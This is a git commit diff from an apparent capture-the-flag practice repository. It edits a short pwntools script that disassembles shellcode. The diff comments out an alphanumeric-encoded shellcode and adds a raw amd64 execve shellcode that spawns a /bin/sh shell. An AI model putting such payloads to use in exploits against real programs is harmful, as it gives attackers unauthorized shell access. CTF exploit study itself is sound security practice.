7ebc46635b2b0d54ebc7565c15fc743a9bb1f20a
elite3312 <perrywu12@gmail.com>
2022-11-14 23:00:29 +0800

    complete modomodohayaku

--- pwn/modomodohayaku/disasm_shellcode.py
+++ pwn/modomodohayaku/disasm_shellcode.py
@@ -5,8 +5,8 @@ with context.local():
     context.arch = 'amd64'
 
 
-    shellcode = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
-
+    #shellcode = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
+    shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
     print(disasm(
         flat(
             [shellcode])))
